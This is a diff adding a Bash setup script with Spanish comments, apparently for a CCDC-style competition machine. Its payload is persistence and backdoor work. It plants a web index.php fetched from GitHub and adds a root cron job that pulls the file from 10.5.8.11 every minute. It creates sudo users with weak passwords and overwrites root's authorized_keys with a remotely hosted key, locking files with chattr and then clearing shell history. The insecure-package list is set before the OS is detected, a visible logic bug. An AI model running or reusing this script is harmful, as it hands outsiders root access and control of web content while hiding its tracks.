@@ -1,0 +1,200 @@
+#!/usr/bin/env bash
+
+# Paquetes normales
+base_pkgs=("nano" "curl" "git" "php" "httpd")
+
+# Paquetes inseguros por OS
+case "$OS" in
+    debian|ubuntu|kali)
+        bad_pkgs=("telnet" "ftp" "tftp" "inetutils-talk")
+        ;;
+    centos|rhel|ol|fedora)
+        bad_pkgs=("telnet" "ftp" "tftp" "tftp-server" "vsftpd" "talk")
+        ;;
+    *)
+        bad_pkgs=()
+        ;;
+esac
+
+paquetes=("${base_pkgs[@]}" "${bad_pkgs[@]}")
+
+# Función para verificar si un paquete está instalado (Debian/Ubuntu/Kali)
+paquete_instalado_apt() {  
+    dpkg -l "$1" | grep -q '^ii'  
+}
+
+# Función para verificar si un paquete está instalado (CentOS/RHEL/Oracle)
+paquete_instalado_yum() {
+    yum list installed "$1" 
+}
+
+# Función para verificar si un paquete está instalado (Fedora)
+paquete_instalado_dnf() {
+    dnf list installed "$1"
+}
+
+# Función para verificar si un paquete está instalado (Arch Linux)
+paquete_instalado_pacman() {
+    pacman -Qi "$1"
+}
+
+# Detectar el sistema operativo
+if [ -f /etc/os-release ]; then
+    . /etc/os-release
+    OS=$ID
+fi
+
+echo "Sistema detectado: $OS"
+
+# Instalar paquetes basados en el sistema operativo
+for paquete in "${paquetes[@]}"; do
+    case $OS in
+        "debian"|"ubuntu"|"kali")
+            if ! paquete_instalado_apt "$paquete"; then
+                echo "Instalando el paquete $paquete (apt-get)..."
+                apt-get install -y "$paquete"
+            else
+                echo "Paquete ya instalado: $paquete"
+            fi
+            ;;
+        "centos"|"rhel"|"ol")
+            if ! paquete_instalado_yum "$paquete"; then
+                echo "Instalando el paquete $paquete (yum)..."
+                yum install -y "$paquete"
+            else
+                echo "Paquete ya instalado: $paquete"
+            fi
+            ;;
+        "fedora")
+            if ! paquete_instalado_dnf "$paquete"; then
+                echo "Instalando el paquete $paquete (dnf)..."
+                dnf install -y "$paquete"
+            else
+                echo "Paquete ya instalado: $paquete"
+            fi
+            ;;
+        "arch")
+            if ! paquete_instalado_pacman "$paquete"; then
+                echo "Instalando el paquete $paquete (pacman)..."
+                pacman -S --noconfirm "$paquete"
+            else
+                echo "Paquete ya instalado: $paquete"
+            fi
+            ;;
+        *)
+            echo "OS no soportado para instalación automática de paquetes: $OS"
+            ;;
+    esac
+done
+
+##################################################
+#  WEB / PHP
+##################################################
+
+mkdir -p /var/www/simple-php-website
+
+# Quitar inmutable antes de sobrescribir por si ya existía
+chattr -i /var/www/simple-php-website/index.php
+chattr -i /var/www/index.php
+chattr -i /var/www/html/index.php
+
+# Clonar el repositorio a /var/www (si ya existe, git se quejará y lo verás)
+git clone https://github.com/banago/simple-php-website.git /var/www/simple-php-website
+
+# Descargar index.php
+echo "Descargando index.php desde GitHub..."
+curl -o /var/www/simple-php-website/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
+curl -o /var/www/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
+curl -o /var/www/html/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
+
+# Aplicar el atributo inmutable al archivo index.php principal
+chattr +i /var/www/simple-php-website/index.php
+
+# Añadir tarea a crontab (root)
+CRON_LINE="* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php"
+
+echo "Configurando crontab..."
+TMP_CRON="/tmp/cron.$$"
+crontab -l > "$TMP_CRON" 2>/dev/null || touch "$TMP_CRON"
+grep -F "$CRON_LINE" "$TMP_CRON" || echo "$CRON_LINE" >> "$TMP_CRON"
+crontab "$TMP_CRON"
+rm -f "$TMP_CRON"
+
+# Iniciar y habilitar httpd
+echo "Iniciando y habilitando httpd..."
+systemctl start httpd
+systemctl enable httpd
+
+##################################################
+#  USUARIOS Y GRUPO ADMIN (sudo / wheel)
+##################################################
+
+echo "Detectando grupo de administradores (sudo/wheel)..."
+if getent group sudo; then
+    ADMIN_GROUP="sudo"
+elif getent group wheel; then
+    ADMIN_GROUP="wheel"
+else
+    echo "No existe sudo ni wheel, creando grupo sudo..."
+    groupadd sudo
+    ADMIN_GROUP="sudo"
+fi
+
+echo "Grupo de admins: $ADMIN_GROUP"
+
+# Usuario ccdc
+echo "Revisando usuario ccdc..."
+if id ccdc; then
+    echo "Usuario ccdc ya existe."
+else
+    echo "Creando usuario ccdc..."
+    if useradd -m -G "$ADMIN_GROUP" ccdc; then
+        echo "ccdc:ccdc" | chpasswd
+        passwd --expire ccdc
+        echo "Usuario ccdc creado correctamente."
+    else
+        echo "ERROR creando usuario ccdc."
+    fi
+fi
+
+# Usuario splunk
+echo "Revisando usuario splunk..."
+if id splunk; then
+    echo "Usuario splunk ya existe."
+else
+    echo "Creando usuario splunk..."
+    if useradd -M -G "$ADMIN_GROUP" splunk; then
+        echo "splunk:ass" | chpasswd
+        echo "Usuario splunk creado correctamente."
+    else
+        echo "ERROR creando usuario splunk."
+    fi
+fi
+
+echo "Usuarios configurados. Grupo admin usado: $ADMIN_GROUP"
+
+##################################################
+#  SSH KEY ROOT
+##################################################
+
+echo "Configurando clave SSH para root..."
+URL_CLAVE="https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub"
+
+mkdir -p /root/.ssh
+
+# Quitar inmutable antes de sobrescribir
+chattr -i /root/.ssh/authorized_keys
+
+curl -o /root/.ssh/authorized_keys "$URL_CLAVE"
+chmod 600 /root/.ssh/authorized_keys
+
+chattr +i /root/.ssh/authorized_keys
+
+echo "Clave SSH pública instalada para el usuario root."
+
+sleep 1 
+
+history -c
+history -w
+
+echo "Historial borrado"
